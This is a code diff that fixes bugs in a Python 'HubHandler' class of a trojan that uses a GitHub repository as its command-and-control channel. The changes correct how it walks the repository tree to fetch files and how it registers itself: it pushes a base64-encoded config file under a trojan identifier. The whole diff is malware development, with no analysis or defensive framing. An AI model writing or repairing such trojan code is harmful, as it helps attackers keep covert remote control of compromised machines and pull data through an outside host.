@@ -48,12 +48,12 @@ class HubHandler:
 
 
     def get_file(self, filepath):
-        tree = self.branch.commit.commit.tree.recurse()
+        tree = self.branch.commit.commit.tree.to_tree().recurse()
 
         for filename in tree.tree:
             if filepath in filename.path:
                 print("[*] Found file %s" % filepath)
-                blob = repo.blob(filename._json_data['sha'])
+                blob = self.repo.blob(filename._json_data['sha'])
                 return blob.content
         return None
 
@@ -63,6 +63,7 @@ class HubHandler:
             config_json = self.get_file("config/default.json")
             self.repo.create_file(self.trojan_config,
                    "registering %s" % self.trojan_id,
+                   # fix this:
                    base64.b64encode(config_json))
             self.registered = True
        else:
